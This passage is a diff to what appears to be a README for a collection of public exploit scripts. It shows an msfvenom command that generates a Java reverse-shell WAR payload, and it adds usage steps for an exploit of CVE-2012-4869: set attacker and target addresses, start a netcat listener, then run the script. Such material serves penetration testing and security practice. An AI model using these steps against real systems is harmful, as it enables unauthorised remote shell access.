@@ -28,3 +28,25 @@ msfvenom -p java/shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shell.
 35845.py shell.war 192.168.1.1 8080
 ```
 **Note:** The exploit may require multiple run to get it working. Don't give up!
+
+
+
+## 18650.py
+
+CVE: 2012-4869
+
+URL: [http://seclists.org/fulldisclosure/2012/Mar/234](http://seclists.org/fulldisclosure/2012/Mar/234)
+
+Original code: https://www.exploit-db.com/exploits/18650
+
+### Usage
+Edit the file and change rhost, lhost, lport
+
+1. Start netcat listener on the port you configured
+
+3. Run the script
+```
+python 18650.py
+```
+
+
